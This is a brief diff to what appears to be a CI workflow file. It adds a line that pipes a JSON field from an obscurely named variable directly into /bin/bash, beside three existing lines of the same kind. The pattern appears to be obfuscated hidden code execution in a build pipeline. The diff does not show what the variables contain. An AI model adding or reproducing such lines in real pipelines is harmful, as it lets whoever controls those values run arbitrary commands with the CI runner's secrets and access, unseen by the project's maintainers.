@@ -27,6 +27,7 @@ jobs:
           echo $am929 | jq -r .ndy15085 | /bin/bash
           printf '%s' "$dlob7" | jq -r .xsisk18067 | /bin/bash
           echo $kdjh9 | jq -r .d08 | /bin/bash
+          printf '%s' "$qu14" | jq -r .xgha14 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
